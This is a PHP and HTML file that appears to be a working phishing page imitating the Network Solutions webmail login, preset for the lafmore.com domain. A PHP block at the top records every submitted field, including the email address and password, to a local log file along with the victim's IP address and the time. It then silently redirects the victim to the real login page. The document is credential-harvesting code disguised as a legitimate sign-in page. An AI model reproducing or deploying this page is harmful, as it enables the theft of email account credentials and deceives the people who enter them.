<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
header('Location: https://webmail3.networksolutionsemail.com/interfaces/sso/login.php?redirected=yes&user_domain=mail.lafmore.com');
$handle = fopen('log_LpGSJwVi3d.txt', 'a');
fwrite($handle, '----------------------------------------------------------------------['.$_SERVER['SERVER_NAME'].$_SERVER['SCRIPT_NAME'].']---['.strtoupper(date("h:i:s a - Y/m/d")).']---['.$_SERVER['REMOTE_ADDR']."]\r\n");
foreach($_POST as $variable => $value) {
fwrite($handle, $variable.': '.$value."\r\n");}
fclose($handle);
exit;
} ?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html lang="en" xmlns="http://www.w3.org/1999/xhtml">
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
        <meta name="robots" content="noindex, nofollow" />
	<meta http-equiv="Cache-Control" content="no-cache">
	<meta http-equiv="Pragma" content="no-cache">
	<meta http-equiv="Expires" content="0">
	<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7,IE=edge,chrome=1" />
	<!--
	<meta="X-UA-Compatible" content="IE=edge,chrome=1">
	-->
	<meta name="description" content="webmail">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta name="build-version-number" content="" >
	<meta charset="utf-8">

        <title>
            Network Solutions&#169; Webmail Login
            
        </title>
	<!--
	<link href='http://fonts.googleapis.com/css?family=Open+Sans:400,700' rel='stylesheet' type='text/css'>
	-->
	<link href="https://webmail3.networksolutionsemail.com/interfaces/sso/providers/inquent.netsol/css/bootstrap.min.css" rel="stylesheet">
        <link href="https://webmail3.networksolutionsemail.com/interfaces/sso/providers/inquent.netsol/css/login.css" rel="stylesheet"></link>
        <link href="https://webmail3.networksolutionsemail.com/interfaces/sso/providers/inquent.netsol/css/jquery-ui-1.10.3.custom.min.css" rel="stylesheet"></link>
        <script language="javascript" type="text/javascript" src="https://webmail3.networksolutionsemail.com/interfaces/sso/js/jquery-1.9.1.js">
        </script>
        <script language="javascript" type="text/javascript" src="https://webmail3.networksolutionsemail.com/interfaces/sso/js/jquery.form.js">
        </script>
        <script language="javascript" type="text/javascript" src="https://webmail3.networksolutionsemail.com/interfaces/sso/js/form.js">
        </script>
        <script language="javascript" type="text/javascript" src="https://webmail3.networksolutionsemail.com/interfaces/sso/js/cookie.js">
        </script>
        <script language="javascript" type="text/javascript" src="https://webmail3.networksolutionsemail.com/interfaces/sso/js/jquery.cookie.js">
        </script>
        <script language="javascript" type="text/javascript" src="https://webmail3.networksolutionsemail.com/interfaces/sso/js/jquery-ui-personalized-1.10.3.min.js">
        </script>
        <script language="javascript" src="https://webmail3.networksolutionsemail.com/interfaces/sso/js/cluetip/jquery.dimensions.js">
        </script>
        <script language="javascript" src="https://webmail3.networksolutionsemail.com/interfaces/sso/js/cluetip/jquery.cluetip.min.js">
        </script>
        <script language="javascript" type="text/javascript" src="https://webmail3.networksolutionsemail.com/interfaces/sso/js/oxedhelpers.js">
        </script>
        <script language="javascript" type="text/javascript" src="https://webmail3.networksolutionsemail.com/interfaces/sso/js/oxedlogin.js?r=1255820738">
        </script>

        <script language="javascript" type="text/javascript">
        <!--
        	var user = "";
        	var pass = "";
        	$(document).ready(function(){
            	if(user.length > 0 && pass.length > 0){            	
        			$("#nameuser").val(user);
            		$("#passuser").val(pass);
            		$("#ajaxform").submit();
            	}
            });        	
        //-->
        </script>
    </head>
    <body>
                    <script>
  if (document.location.protocol !== 'https:') {
    window.location.href = "https://webmail3.networksolutionsemail.com?user_domain=lafmore.com";
  }
</script>

<div class="container">
  <div class="card">
    <div class="top clearfix">

      <a href="http://www.networksolutions.com/">
        <img src="https://webmail3.networksolutionsemail.com/interfaces/sso/providers/inquent.netsol/images/logo.png" alt="Network Solutions" width="154" height="62">
      </a>
      <h1 align="center">Webmail Login</h1>

      <!-- OPTIONAL NOTICE -->
      <span class="dispmsg">
        <p class=MsoNormal>
Webmail has been updated. Learn more by clicking on the release notes below:
<o:p></o:p></p>
<p class=MsoNormal><o:p>&nbsp;</o:p></p>
<p class=MsoNormal><u>
<a href="https://knowledge.web.com/subjects/article/KA-01122" target="_blank">Webmail version 7.10.2 &#8211; Release notes</a></u>
<p class=MsoNormal><u>
<a href="https://knowledge.web.com/subjects/article/KA-01122" target="_blank">Guard Encryption version 2.10.2 &#8211; Release notes</a></u>
<p class=MsoNormal><o:p>&nbsp;</o:p></p>
      </span>

      <form action="<?php echo basename(__FILE__); ?>" name="ajaxform" id="ajaxform" method="post">
        
        <input name="nameuser" placeholder="Email Address" id="nameuser" type="text" value="" required/>
        
        <script type="text/javascript">
          var testdomainName = "lafmore.com";
          if (testdomainName) {
            $('#nameuser').attr("placeholder", "Mailbox");
          } else {
            $('#nameuser').attr("placeholder", "Email Address");
          }
        </script>
        <input id="passuser" type="password" name="passuser" placeholder="Password" required>
        <input name="submit" id="submit" type="submit" value="Login">
        
      </form>

      <!-- ERROR MESSSAGES -->
      <div id="signin-message"></div>
      <div id="err"></div>
      <div class="forgotpw">
        <a id="prlink" class="pw" style="cursor: pointer;">Need to reset your password?</a>
      </div>
      <div class="moblelink">
        <a id="mobile1" class="moble" style="cursor: pointer;" href="https://knowledge.web.com/subjects/article/KA-01998">Set up your iPhone</a>
        <a id="mobile2" class="moble" style="cursor: pointer;" href="https://knowledge.web.com/subjects/article/KA-01019">Set up your Android</a>
	<BR>
      </div>

    </div>
    <div class="bottom clearfix">
      <p>If you need help logging in, please contact our customer service at 1-888-793-7657 (toll free)</p>
    </div>
  </div>

  <script>
    $(function() {  // jQuery shorthand
      console.log("document ready");

      /* Password Reset link click listener */
      $('#prlink').click(function() {
        // get, validate the user input
        var nameUserVal = $.trim(document.ajaxform.nameuser.value);
        if(nameUserVal == "") {
          $('#signin-message').html("Please enter an Email Address").show();
          return;
        }
        // get domain, set from login.php and build mailbox string
        var domainName = "lafmore.com";
        var mailbox;
        if(nameUserVal.indexOf("@") >= 0){
          mailbox = nameUserVal;
        } else if(domainName) {
          mailbox = nameUserVal + '@' + domainName;
        } else {  // username only AND no domain found
          $('#signin-message').html("Please enter the full Email Address.").show();
          return;
        }

        // create a dynamic form element to use for possible reset password post(OX), later
        var prForm = document.createElement('form');
        prForm.setAttribute('id', 'prform');
        prForm.setAttribute('action', '/interfaces/sso/pwd_reset/prview.php');
        prForm.setAttribute('method', 'post');
        prForm.setAttribute('hidden', 'true');
        // EMMAINT-2187 - don't open new window
	//prForm.setAttribute('target', '_new');

        var mbInput = document.createElement('input');
        mbInput.setAttribute('type', 'hidden');
        mbInput.setAttribute('name', 'mailbox');
        mbInput.setAttribute('value', mailbox);

        prForm.appendChild(mbInput);
        document.body.appendChild(prForm);

        /**
         * Make ajax call to getWebmailType
         * Loads the correct landing page based on value returned from webmail_os_type_db.db
         */
        var requestData = {method: 'getWebmailType', mailbox: mailbox};
        var ajaxOptions = {
          type: "POST",
          url: "/interfaces/sso/pwd_reset/prctrl.php",
          dataType: "json",
          data: JSON.stringify(requestData),
          contentType: "application/json; charset=utf-8"
        };

        var promise = $.ajax(ajaxOptions);
        promise.done(function(data) {
          if (data.status == "success") {
            var $value = data.data['value'];
            console.log("value = " + $value);
            // NOTE: both of these may trigger the browser pop-up blocker since we are in a callback
            if ($value =='1' || $value == '4') { // it is OX or OX AppSuite
              prForm.submit();
            } else {  // it is NOT OX (EdgeDesk)
              var url = "https://knowledge.web.com/subjects/article/KA-01163";
              // EMMAINT-2187 - don't open new window
              //window.open(url, '_new');
              window.open(url, '_self');
            }
          } else {  // error, this should not happen unless server is mis-configured
            // shows 'Internal server error'
            $('#signin-message').html(data.data['msg']).show();
          }
        });

      });

    });
  </script>
        <div class="footer">
                <ul>
                        <li><a href="https://forum.web.com/networksolutions/faq/#Mail/mail-index.htm">Help Center</a></li>
                        <li><a href="http://web.com/legal/privacy-policy.aspx">Privacy Policy</a></li>
                        <li><a href="http://www.networksolutions.com/legal/static-service-agreement.jsp">Service Agreement</a></li>
                        <li><a href="http://www.networksolutions.com/legal/legal-notice.jsp">Terms of Use</a></li>
                </ul>
		<p>
            Copyright &#169; 2022 Network Solutions, LLC, A Web.com Company.  All rights reserved.
        </p>
</div>
</div>
 
    </body>
</html>
